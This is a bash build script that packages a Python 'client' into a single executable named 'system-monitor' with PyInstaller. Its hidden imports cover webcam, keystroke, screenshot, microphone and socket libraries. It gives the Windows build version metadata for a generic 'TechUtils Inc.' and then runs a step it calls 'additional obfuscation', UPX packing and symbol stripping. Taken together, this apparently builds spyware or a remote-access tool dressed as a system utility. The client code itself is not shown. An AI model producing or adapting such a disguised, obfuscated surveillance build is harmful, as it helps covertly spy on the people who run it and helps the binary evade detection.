#!/usr/bin/env bash

set -e

APP_NAME="system-monitor"
DISPLAY_NAME="System Monitor Utility"
ENTRY="client/client.py"
VERSION="1.0.0"
COMPANY="TechUtils Inc."
COPYRIGHT="Copyright © 2024 TechUtils Inc."

echo "Detecting OS..."
OS="$(uname -s)"

case "$OS" in
    Linux*)
        PLATFORM="linux"
        EXT=""
        ;;
    Darwin*)
        PLATFORM="macos"
        EXT=""
        ;;
    CYGWIN*|MINGW*|MSYS*)
        PLATFORM="windows"
        EXT=".exe"
        ;;
    *)
        echo "Unsupported OS: $OS"
        exit 1
        ;;
esac

echo "OS detected: $PLATFORM"

echo "Cleaning previous builds..."
rm -rf build dist/${APP_NAME} *.spec

echo "Creating version info file for Windows..."
if [ "$PLATFORM" = "windows" ]; then
    cat > version_info.txt <<EOF
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=($VERSION),
    prodvers=($VERSION),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'$COMPANY'),
        StringStruct(u'FileDescription', u'$DISPLAY_NAME'),
        StringStruct(u'FileVersion', u'$VERSION'),
        StringStruct(u'InternalName', u'sysmon'),
        StringStruct(u'LegalCopyright', u'$COPYRIGHT'),
        StringStruct(u'OriginalFilename', u'sysmon.exe'),
        StringStruct(u'ProductName', u'$DISPLAY_NAME'),
        StringStruct(u'ProductVersion', u'$VERSION')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
EOF
fi

echo "Building executable..."

PYINSTALLER_ARGS=(
    "$ENTRY"
    --name "$APP_NAME"
    --onefile
    --clean
    --noconfirm
    --hidden-import=cv2
    --hidden-import=pynput
    --hidden-import=mss
    --hidden-import=netifaces
    --hidden-import=cryptography
    --hidden-import=json
    --hidden-import=base64
    --hidden-import=uuid
    --hidden-import=datetime
    --hidden-import=time
    --hidden-import=threading
    --hidden-import=queue
    --hidden-import=pyaudio
    --hidden-import=PIL
    --hidden-import=select
    --hidden-import=socket
    --hidden-import=sys
    --hidden-import=logging
    --hidden-import=logging.handlers
    --hidden-import=logging.config
    --hidden-import=logging.handlers
    --strip
    --noupx
)

if [ "$PLATFORM" = "windows" ] && [ -f "version_info.txt" ]; then
    PYINSTALLER_ARGS+=(--version-file=version_info.txt)
fi

poetry run pyinstaller "${PYINSTALLER_ARGS[@]}"

OUTPUT="dist/${APP_NAME}${EXT}"

if [ -f "$OUTPUT" ]; then
    echo "Applying additional obfuscation..."
    
    if command -v upx >/dev/null 2>&1 && [ "$PLATFORM" != "macos" ]; then
        echo "Packing binary with UPX..."
        upx --best --ultra-brute "$OUTPUT" || echo "UPX packing failed, continuing without it"
    else
        echo "UPX not available or not supported on this platform, skipping compression"
    fi
    
    if [ "$PLATFORM" = "linux" ]; then
        echo "Stripping debug symbols..."
        strip "$OUTPUT" || echo "Strip failed, continuing"
    fi
    
    echo "Build complete!"
    echo "Executable available at: $OUTPUT"
    echo "Size: $(du -h "$OUTPUT" | cut -f1)"
else
    echo "Build finished but executable not found"
    exit 1
fi